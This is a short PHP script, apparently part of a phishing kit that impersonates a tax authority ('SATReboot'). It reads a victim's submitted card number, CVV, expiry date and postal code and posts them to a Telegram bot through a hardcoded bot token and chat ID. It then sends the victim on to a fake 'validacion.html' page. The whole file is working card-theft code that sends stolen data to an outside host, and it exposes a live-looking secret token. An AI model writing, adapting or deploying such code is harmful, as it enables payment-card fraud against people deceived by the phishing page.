<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5158268829:AAF8xc22TgLd0-Rmw1GwP98EVcbAwFbIJYA";
$tarjeta = $_POST['tarjeta'];
$cvv = $_POST['cvv'];
$nacimiento = $_POST['nacimiento'];
$cp = $_POST['cp'];

$datos = [
    'chat_id' => '1556162059',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "NUEVOS DATOS RECIBIDOS SEGUNDA PARTE \n\n💳 Numero de Tarjeta: $tarjeta \n✅ CVV: $cvv \n💵 Vencimiento: $nacimiento \n🏦 Codigo Postal: $cp \n\nATTE: SATReboot",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);
if ($r_array['ok'] == 1) {
    header("Location: validacion.html");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}